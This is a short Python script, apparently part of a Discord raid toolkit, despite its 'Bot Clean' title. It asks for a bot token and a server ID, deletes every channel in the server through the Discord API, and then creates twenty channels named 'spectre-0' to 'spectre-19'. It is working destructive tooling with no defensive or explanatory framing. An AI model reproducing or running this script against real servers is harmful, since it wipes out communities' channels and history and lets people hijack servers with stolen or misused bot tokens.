import sys, os
_root = os.path.dirname(os.path.abspath(__file__)).rsplit("Tools",1)[0]
if _root not in sys.path:
    sys.path.insert(0,_root)
from Core.Engine import *

set_title("Bot Clean")
print(LOGO)
token = input(f"{PM} Bot Token -> {RS}").strip()
gid = input(f"{PM} Server ID -> {RS}").strip()
h = {"Authorization": f"Bot {token}"}
try:
    for ch in requests.get(f"https://discord.com/api/v9/guilds/{gid}/channels", headers=h, timeout=10).json():
        requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=h)
    for i in range(20):
        requests.post(f"https://discord.com/api/v9/guilds/{gid}/channels",
                      json={"name":f"spectre-{i}","type":0}, headers=h)
    print(f"\n{OK} Done!")
except Exception as e:
    die(str(e))
pause()
restart()
